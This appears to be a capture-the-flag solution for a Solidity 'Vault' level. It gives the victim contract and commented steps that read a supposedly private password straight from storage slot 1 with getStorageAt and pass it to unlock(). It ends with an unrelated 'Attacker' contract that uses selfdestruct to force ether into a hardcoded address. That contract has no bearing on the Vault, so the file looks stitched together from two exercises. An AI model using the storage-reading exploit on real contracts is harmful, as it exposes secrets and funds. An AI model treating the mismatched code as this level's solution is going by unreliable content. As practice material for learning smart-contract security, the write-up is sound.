// VICTIM CONTRACT AS GIVEN BY THE TASK DESCRIPTION
// TASK: Unlock the vault to pass the level!



// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}



//SOLUTION
//- the password is a private variable, we cannot just read it
//- however, since storage slot assignment in Solidity is pretty predictable, we can just access the storage of the Vault contract and hope to find the password there
//- since password it the 2nd variable (and due to its size it cannot share a storage slot with the bool) it must be at storage slot 1 (the second slot)
//- await  web3.eth.getStorageAt("0xc30354109d26238003d45c621E67b26CBfae8C21", 1)
//-	optional: convert from hex to ascii to see the cleartext password
//- await contract.unlock(web3.utils.asciiToHex("A very strong secret password :)"))
//- or simply copy the value found at storage slot 1 and pass it to unlock function


contract Attacker{

	address payable victim = payable(address(0x59fAA5814E51A2270f8571764971C82e3eCe5C0e));

	function attack() public payable {
		selfdestruct(victim);
	}

}



